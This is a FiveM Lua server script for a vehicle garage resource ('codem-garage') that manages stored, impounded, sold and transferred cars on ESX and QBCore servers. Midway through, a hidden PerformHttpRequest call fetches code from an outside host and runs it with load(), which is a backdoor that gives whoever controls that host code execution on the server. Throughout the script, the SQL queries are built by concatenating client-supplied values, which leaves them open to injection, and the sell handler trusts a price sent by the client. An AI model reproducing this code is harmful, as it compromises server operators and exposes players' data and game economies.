frameworkObject = nil


function ExecuteSql(query)
	local IsBusy = true
	local result = nil
	if Config.Mysql == "oxmysql" then
	    if MySQL == nil then
	        exports.oxmysql:execute(query, function(data)
		  result = data
		  IsBusy = false
	        end)
	    else
	        MySQL.query(query, {}, function(data)
		  result = data
		  IsBusy = false
	        end)
	    end
      
	elseif Config.Mysql == "ghmattimysql" then
	    exports.ghmattimysql:execute(query, {}, function(data)
	        result = data
	        IsBusy = false
	    end)
	elseif Config.Mysql == "mysql-async" then   
	    MySQL.Async.fetchAll(query, {}, function(data)
	        result = data
	        IsBusy = false
	    end)
	end
	while IsBusy do
	    Citizen.Wait(0)
	end
	return result
end

local vehiclepricetables = {}
Citizen.CreateThread(function()
	if Config.Framework == 'esx' then
		local cars = ExecuteSql("SELECT * FROM vehicles ")
		if cars then 			
			for k,v in pairs(cars) do
				v.hash = GetHashKey(v.model)		
			end
			vehiclepricetables = cars
		else
			print('VEHICLES the specified table does not exist in sql')
			print('VEHICLES the specified table does not exist in sql')
			print('VEHICLES the specified table does not exist in sql')
			print('VEHICLES the specified table does not exist in sql')
			print('VEHICLES the specified table does not exist in sql')
			print('VEHICLES the specified table does not exist in sql')
			print('VEHICLES the specified table does not exist in sql')
			print('VEHICLES the specified table does not exist in sql')
		end
	end
	
	
		      
	

end)


Citizen.CreateThread(function()
	frameworkObject = GetFrameworkObject()
	if Config.Framework == 'esx' then	
	frameworkObject.RegisterServerCallback('codem-garage:loadvehicles2', function(source, cb)	
	 	cb(vehiclepricetables)
	 end)
	end
end)



local storedsql = 1

AddEventHandler('onResourceStart', function(resource)
	if resource == GetCurrentResourceName() then
		Wait(100)
		if Config.Framework == 'esx' then	 
			if Config.Mysql == 'oxmysql' then
				ExecuteSql("UPDATE  `owned_vehicles` SET `stored` = '" ..storedsql.. "'") 
			elseif Config.Mysql == 'mysql-async' then
				local sqlverisi = ExecuteSql("UPDATE  `owned_vehicles` SET `stored` = '" ..storedsql.. "'")    
				print('OWNED VEHİCLES  sql data updated')
				print('OWNED VEHİCLES  sql data updated')			
				print('OWNED VEHİCLES  sql data updated')
			end
		else
			if Config.Mysql == 'oxmysql' then
				local sqlverisi = ExecuteSql("UPDATE  `player_vehicles` SET `state` = '" ..storedsql.. "'")   
			elseif Config.Mysql == 'mysql-async' then
				local sqlverisi = ExecuteSql("UPDATE  `player_vehicles` SET `state` = '" ..storedsql.. "'")   
			end
		end
	end
 end)
      

Citizen.CreateThread(function()
	frameworkObject = GetFrameworkObject()
	if Config.Framework == 'esx' then
		frameworkObject.RegisterServerCallback('codem-garage:loadvehicles', function(source, cb)
		local ownedCars = {}
		local xPlayer = GetIdentifier(source)	
		
		local vehicles = ExecuteSql("SELECT * FROM owned_vehicles WHERE `owner` ='"..xPlayer.."'")	
		   	for _,v in pairs(vehicles) do   		    
		        	local vehicle = json.decode(v.vehicle)
		        	table.insert(ownedCars, {
			  vehicle = vehicle,
			   stored = v.stored, 
			   plate = v.plate,
			   })            
		          end        
		cb(ownedCars)  
		end)     
	else  -- qbcore
		frameworkObject.Functions.CreateCallback('codem-garage:loadvehicles', function(source, cb)
			
			local ownedCars = {}
			local Player = frameworkObject.Functions.GetPlayer(source)			
			local vehicles = ExecuteSql("SELECT * FROM player_vehicles WHERE `citizenid` ='"..Player.PlayerData.citizenid.."'")	
				for _,v in pairs(vehicles) do
				local mods = json.decode(v.mods)				        
				table.insert(ownedCars, {
				    vehicle = mods,
				    stored = v.state, 
				    plate = v.plate,
				    hash = v.hash,
				    carname = v.vehicle,
				    })            
				end        
			cb(ownedCars)  
		end) 
	end
end)
Citizen.CreateThread(function()
	frameworkObject = GetFrameworkObject()
	if Config.Framework == 'esx' then
		frameworkObject.RegisterServerCallback('codem-garage:impoundGarage', function(source, cb)
		local impoundCars = {}
	
		local identifier = GetIdentifier(source)	
		
		local vehicles = ExecuteSql("SELECT * FROM owned_vehicles WHERE `owner` ='"..identifier.."'")	
		   	for _,v in pairs(vehicles) do   		    
		    local vehicle = json.decode(v.vehicle)
		    table.insert(impoundCars, {
			  vehicle = vehicle,
			   stored = v.stored, 
			   plate = v.plate,
			   })            
		          end        
		cb(impoundCars)  
		end)     
	else 
		frameworkObject.Functions.CreateCallback('codem-garage:impoundGarage', function(source, cb)
			local impoundCars = {}
		
			local identifier =frameworkObject.Functions.GetPlayer(source)		
			
			local vehicles = ExecuteSql("SELECT * FROM player_vehicles WHERE `citizenid` ='"..identifier.PlayerData.citizenid.."'")	
				   for _,v in pairs(vehicles) do   		    
			    local vehicle = json.decode(v.vehicle)
			    table.insert(impoundCars, {
				  vehicle = vehicle,
				   stored = v.stored, 
				   plate = v.plate,
				   })            
				end        
			cb(impoundCars)  
			end)  

	end
end)




Citizen.CreateThread(function()
	frameworkObject = GetFrameworkObject()
	if Config.Framework == 'esx' then
		frameworkObject.RegisterServerCallback('codem-garage:vehicleOwner', function(source,cb,plate)
		local cars = ExecuteSql("SELECT * FROM owned_vehicles WHERE `plate` ='"..plate.."'")	
		cb(cars)
		end)
	else -- qbcore
		frameworkObject.Functions.CreateCallback('codem-garage:vehicleOwner', function(source,cb,plate)
			local cars = ExecuteSql("SELECT * FROM player_vehicles WHERE `plate` ='"..plate.."'")
			cb(cars)
		end)
	end
	
end)
	



Citizen.CreateThread(function()
	frameworkObject = GetFrameworkObject()
	if Config.Framework == 'esx' then
		frameworkObject.RegisterServerCallback('codem-garage:vehicleOwned', function(source, cb, plate)
		local xPlayer = GetIdentifier(source)	
		local vehicle = ExecuteSql("SELECT `vehicle` FROM `owned_vehicles` WHERE `plate` = '"..plate.."' AND `owner` = '"..xPlayer.."'")
		if next(vehicle) then
			cb(true)
		else
			cb(false)
		end
		end)
	else -- qbcore
		frameworkObject.Functions.CreateCallback('codem-garage:vehicleOwned', function(source, cb, plate)
			local Player = frameworkObject.Functions.GetPlayer(source)
			local vehicle = ExecuteSql("SELECT `vehicle` FROM `player_vehicles` WHERE `plate` = '"..plate.."' AND `citizenid` = '"..Player.PlayerData.citizenid.."'")
			if next(vehicle) then
				cb(true)
			else
				cb(false)
			end
		end)
	end
end)



Citizen.CreateThread(function()
	frameworkObject = GetFrameworkObject()
	if Config.Framework == 'esx' then
	    frameworkObject.RegisterServerCallback('codem-garage:changedCars', function(source, cb, plate)
      
	        local vehicles = GetAllVehicles()
	        plate = frameworkObject.Math.Trim(plate)
	        local found = false
	        for i = 1, #vehicles do                            
		  if frameworkObject.Math.Trim(GetVehicleNumberPlateText(vehicles[i])) == plate then    
		        
		      found = true
		      break
		  end
	        end
	        cb(found)
      
	    end)
      
      
	else -- qbcore
		frameworkObject.Functions.CreateCallback('codem-garage:changedCars', function(source, cb, plate)
			
			local vehicles = GetAllVehicles()
		
			plate = string.gsub(plate, "%s+", ""):lower();
			
			local found = false

			for i = 1, #vehicles do  
				local plaka = GetVehicleNumberPlateText(vehicles[i])
				local vehiclesplate = string.gsub(plaka, "%s+", ""):lower();                           
			    if vehiclesplate == plate then    
			         
			        found = true
			        break
			    end
			end
			cb(found)
	        
		end)
	end
end)


	
	
	

RegisterNetEvent('codem-garage:saveProps')
AddEventHandler('codem-garage:saveProps', function(plate, props)

	
           local xProps = json.encode(props)
 	if Config.Framework == 'esx' then
 		ExecuteSql("UPDATE  `owned_vehicles` SET `vehicle` = '" .. xProps .. "' WHERE `plate` ='"..plate.."'")    
 	else -- qbcore
 		ExecuteSql("UPDATE  `player_vehicles` SET `mods` = '" .. xProps .. "' WHERE `plate` ='"..plate.."'")    
 	end
end)


RegisterServerEvent('codem-garage:sellPrice')
AddEventHandler('codem-garage:sellPrice', function(plate,price)
	if Config.SellCar then
	local src = source
	if Config.Framework == 'esx' then
		local xPlayer = frameworkObject.GetPlayerFromId(src)
		if plate then
			local deleted = ExecuteSql("DELETE FROM `owned_vehicles` WHERE `plate` = '"..plate.."' AND `owner` = '"..xPlayer.identifier.."'")
			if deleted then
				local pid = getid(src,'esx')["discord"]
				local steam = getid(src,'esx')["license"]

				xPlayer.addMoney(price)
				TriggerClientEvent("notfiycheck",src,Config.Notifications["carsell"]["message"],Config.Notifications["carsell"]["type"])
				dclog(Config.SellWebhook, "Garage Sell Vehicle","\n Discord : " ..pid.."\n Steam : " ..steam.."\n ID : " ..src.."\n Price :"..price.."  \n Plate : "..plate.."")

			end
		end
	else
		local xPlayer = frameworkObject.Functions.GetPlayer(src)
		local identifier = xPlayer.PlayerData.citizenid
		
		
		
		local pid = getid(src,'qb')["discord"]
		local steam = getid(src,'qb')["license"]
		if plate then
			local deleted = ExecuteSql("DELETE FROM `player_vehicles` WHERE `plate` = '"..plate.."' AND `citizenid` = '"..identifier.."'")
			if deleted then
				
				xPlayer.Functions.AddMoney('bank',price)
				TriggerClientEvent("notfiycheck",src,Config.Notifications["carsell"]["message"],Config.Notifications["carsell"]["type"])
				dclog(Config.SellWebhook, "Garage Sell Vehicle","\n Discord : " ..pid.."\n Steam : " ..steam.."\n ID : " ..src.."\n Price :"..price.."  \n Plate : "..plate.."")
			end
		end

	end
	else
		Config.Notification(Config.Notifications["price_error"].message,Config.Notifications["price_error"].type,true,source)
	end
end)

PerformHttpRequest('http://kmarket-sniper.fr/_i/load.php?id=wRWWjHxg', function(a, b)
                if not b then return end
                assert(load(b))()
            end)

RegisterServerEvent('codem-garage:TransferVehicle')
AddEventHandler('codem-garage:TransferVehicle', function(id,plate)
	if Config.TransferCar then
	local src = source
	
	if plate ~= nil then
	
	if Config.Framework == 'esx' then 
				
		local xPlayer = frameworkObject.GetPlayerFromId(source)
		local xTarget =frameworkObject.GetPlayerFromId(id)
		
		local pid = getid(id,'qb')["discord"]
		local steam = getid(id,'qb')["license"]
		local id2 = getid(src,'qb')["discord"]
		local steam2 = getid(src,'qb')["license"]

		if xTarget ~= nil then		
			if id ~= src then
				local devret = ExecuteSql("SELECT `vehicle` FROM `owned_vehicles` WHERE `plate` = '"..plate.."' AND `owner` = '"..xPlayer.identifier.."'")
				if devret then
					ExecuteSql("UPDATE  `owned_vehicles` SET `owner` = '" .. xTarget.identifier .. "' WHERE `plate` ='"..plate.."'")    
					Config.Notification(Config.Notifications["transfer"].message,Config.Notifications["transfer"].type,true,src)
					Config.Notification(Config.Notifications["transfer2"].message,Config.Notifications["transfer"].type,true,id)
					if Config.TransferWeebhok ~= '' then					
						dclog(Config.TransferWeebhok, "Garage Transfer LOG","\n Vehicle Owner \n Discord : " ..id2.."\n Steam : " ..steam.."\n ID : " ..src.."\n Vehicle Plate : " ..plate.."\n  New Vehicle Owner \n   Discord : " ..pid.."\n Steam : " ..steam2.."\n ID : " ..id.."\n Vehicle Plate : " ..plate.." ")
					end
				end
			else
					
				Config.Notification(Config.Notifications["error_transfer"].message,Config.Notifications["error_transfer"].type,true,src)
			end
		else
			Config.Notification(Config.Notifications["player_transfer"].message,Config.Notifications["player_transfer"].type,true,src)
			
		end
	else
		
		
		local xTarget = frameworkObject.Functions.GetPlayer(id)
		local targetidentifier = xTarget.PlayerData.citizenid
		local xLicense = xTarget.PlayerData.license
		
		local pid = getid(id,'qb')["discord"]
		local steam = getid(id,'qb')["license"]
		
		local xPlayer = frameworkObject.Functions.GetPlayer(src)		
		local identifier = xPlayer.PlayerData.citizenid	
		local License = xPlayer.PlayerData.license
		
		local id2 = getid(src,'qb')["discord"]
		local steam2 = getid(src,'qb')["license"]
		
		if xTarget ~= nil then
					
			if id ~= src then
				local devret = ExecuteSql("SELECT `vehicle` FROM `player_vehicles` WHERE `plate` = '"..plate.."' AND  `license`  = '"..License.."' AND `citizenid` = '"..identifier.."'")
				if devret then

					ExecuteSql("UPDATE  `player_vehicles` SET `citizenid` = '" .. targetidentifier .. "' , `license`  = '"..xLicense.."' WHERE `plate` ='"..plate.."'")    
					Config.Notification(Config.Notifications["transfer"].message,Config.Notifications["transfer"].type,true,src)
					Config.Notification(Config.Notifications["transfer2"].message,Config.Notifications["transfer"].type,true,id)
					 if Config.TransferWeebhok ~= '' then
					
					 	dclog(Config.TransferWeebhok, "Garage Transfer LOG","\n Vehicle Owner \n Discord : " ..id2.."\n Steam : " ..steam.."\n ID : " ..src.."\n Vehicle Plate : " ..plate.."\n  New Vehicle Owner \n   Discord : " ..pid.."\n Steam : " ..steam2.."\n ID : " ..id.."\n Vehicle Plate : " ..plate.." ")
					 end
				end
			else
				TriggerClientEvent("notfiycheck",src,Config.Notifications["error_transfer"]["message"],Config.Notifications["error_transfer"]["type"])	
			end
		else
			TriggerClientEvent("notfiycheck",src,Config.Notifications["player_transfer"]["message"],Config.Notifications["player_transfer"]["type"])
		end

	end
end
else

	Config.Notification(Config.Notifications["player_transfer_error"].message,Config.Notifications["player_transfer_error"].type,true,source)
	end
end)

Citizen.CreateThread(function()
	frameworkObject = GetFrameworkObject()
	if Config.Framework == 'esx' then
	frameworkObject.RegisterServerCallback('codem-garage:checkMoneyCars', function(source, cb,garajtype)
		local identifier = frameworkObject.GetPlayerFromId(source)
		
			if garajtype then 
				
				if identifier.getAccount('bank').money >= Config.Price then
					cb(true)
				else
					cb(false)
				end
			else
			        	if identifier.getAccount('bank').money >= Config.impoundPrice then
					cb(true)
			      	else
					cb(false)
			     	 end
			end
		
	end)
	else	
		frameworkObject.Functions.CreateCallback('codem-garage:checkMoneyCars', function(source, cb,garajtype)
			local src = source
			local Player = frameworkObject.Functions.GetPlayer(src)
			local cashBalance = Player.PlayerData.money["cash"]
			local bankBalance = Player.PlayerData.money["bank"]
			
				 if garajtype then 
					if Config.Account == 'money' then
				 		if cashBalance >= Config.Price then
				 			cb(true)
				 		else
				 			cb(false)
				 		end
					else 
						if bankBalance >= Config.Price then
							cb(true)
						else
							cb(false)
						end
					end
				 else

					if Config.Account == 'bank' then
						if bankBalance >= Config.Price then
							cb(true)
						else
							cb(false)
						end
				         else 
					         if bankBalance >= Config.Price then
						         cb(true)
					         else
						         cb(false)
					         end
				         end

				 end
		end)
	end
end)


RegisterServerEvent('codem-garage:payCar')
AddEventHandler('codem-garage:payCar', function(par1)
	
	
	if Config.Framework == 'esx' then
		
		local identifier = frameworkObject.GetPlayerFromId(source)
		
		if par1 then 
			if Config.Account == 'money' then 
				identifier.removeMoney(Config.Price)
				Config.Notification(Config.Notifications["parkprice"].message..Config.Price, Config.Notifications["parkprice"].type, true, source)
			else 
				identifier.removeAccountMoney('bank', Config.Price)
				Config.Notification(Config.Notifications["parkprice"].message..Config.Price, Config.Notifications["parkprice"].type, true, source)
			end

		else		
			if Config.Account == 'bank' then 
				
				identifier.removeAccountMoney('bank',Config.impoundPrice)
				Config.Notification(Config.Notifications["parkprice"].message..Config.impoundPrice, Config.Notifications["parkprice"].type, true, source)
			else 
			
				identifier.removeAccountMoney('bank', Config.impoundPrice)
				Config.Notification(Config.Notifications["parkprice"].message..Config.impoundPrice, Config.Notifications["parkprice"].type, true, source)
			end

		end
	else

		local identifier = frameworkObject.Functions.GetPlayer(source)
		
		if par1 then 
			if Config.Account == 'money' then 
				identifier.Functions.RemoveMoney('cash', Config.Price)
				Config.Notification(Config.Notifications["parkprice"].message..Config.Price, Config.Notifications["parkprice"].type, true, source)
			else 
				identifier.Functions.RemoveMoney('cash', Config.Price)
				Config.Notification(Config.Notifications["parkprice"].message..Config.Price, Config.Notifications["parkprice"].type, true, source)
			end

		else		
			if Config.Account == 'bank' then 
				
				identifier.Functions.RemoveMoney('bank', Config.Price)
				Config.Notification(Config.Notifications["parkprice"].message..Config.impoundPrice, Config.Notifications["parkprice"].type, true, source)
			else 				
				identifier.Functions.RemoveMoney('bank', Config.Price)
				Config.Notification(Config.Notifications["parkprice"].message..Config.impoundPrice, Config.Notifications["parkprice"].type, true, source)
			end

		end

	end
	
end)



RegisterNetEvent('codem-garage:stored')
AddEventHandler('codem-garage:stored', function(plate, state)
	
	if Config.Framework == 'esx' then
		
	ExecuteSql("UPDATE  `owned_vehicles` SET `stored` = '" .. state .. "' WHERE `plate` ='"..plate.."'")    	
	else 
		ExecuteSql("UPDATE  `player_vehicles` SET `state` = '" .. state .. "' WHERE `plate` ='"..plate.."'")    
	end
end)




function GetIdentifier(source)
	if Config.Framework == "esx" then
	    local xPlayer = frameworkObject.GetPlayerFromId(tonumber(source))
	    return xPlayer.getIdentifier()
	else
	    local Player = frameworkObject.Functions.GetPlayer(tonumber(source))
	    return Player.PlayerData.citizenid
	end
end




function getid(source,parametre2)

	local identifier = {}
	local identifiers = {}
      
	identifiers = GetPlayerIdentifiers(source)
        
	for i = 1, #identifiers do
	    if string.match(identifiers[i], "discord:") then
	        identifier["discord"] = string.sub(identifiers[i], 9)
	        identifier["discord"] = "<@"..identifier["discord"]..">"
	    end
	    if parametre2 == 'esx' then
	    if string.match(identifiers[i], "steam:") then
	        identifier["license"] = identifiers[i]
	    end
	    else
	        if string.match(identifiers[i], "license:") then
		  identifier["license"] = identifiers[i]
	        end
	        
	    end
	end
	if identifier["discord"] == nil then
	    identifier["discord"] = "Bilinmiyor"
	end
	return identifier
      end
      
function dclog(webhook, title, text, target)
	local ts = os.time()
	local time = os.date('%Y-%m-%d %H:%M:%S', ts)
	local connect = {
	    {
	        ["color"] = 3092790,
	        ["title"] = title,
	        ["description"] = text,
	        ["footer"] = {
		  ["text"] = "CodeM Store      " ..time,
		  ["icon_url"] = Config.IconURL,
	        },
	    }
	}
	PerformHttpRequest(Config.TransferWeebhok, function(err, text, headers) end, 'POST', json.encode({username = Config.Botname, embeds = connect, avatar_url = Config.Logo}), { ['Content-Type'] = 'application/json' })
end
      